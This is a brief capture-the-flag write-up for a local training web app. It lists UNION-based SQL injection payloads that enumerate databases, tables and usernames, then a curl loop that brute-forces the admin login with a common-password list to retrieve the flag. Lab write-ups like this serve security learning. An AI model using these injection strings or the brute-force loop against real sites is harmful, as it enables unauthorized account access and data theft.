# BRUTE FORCE

## I - DATABASE INFORMATION GATHERING WITH SQL INJECTION IN "Member search" PAGE

### 1 - LIST OF ALL DATABASES NAME

> \$ 1 AND 1=1 UNION SELECT 1, table_schema FROM information_schema.tables

### 2 - LIST OF TABLE NAME IN Member_Brute_Force DATABASE

> \$ 1 AND 1=1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)


### 3 - CHECK THE USERNAME IN THE db_default TABLE

> \$ 1 AND 1=1 UNION SELECT username,2 FROM Member_Brute_Force.db_default

## II - BRUTEFORCING THE PASSWORD WITH 2020-200_most_used_passwords.txt

> \$ while read PASSWORD; do curl -sL "http://127.0.0.1/?page=signin&username=admin&password=\${PASSWORD}&Login=Login" | grep -oE "The flag is : [[:alnum:]]{64}" && echo "admin:${PASSWORD}"; done < 2020-200_most_used_passwords.txt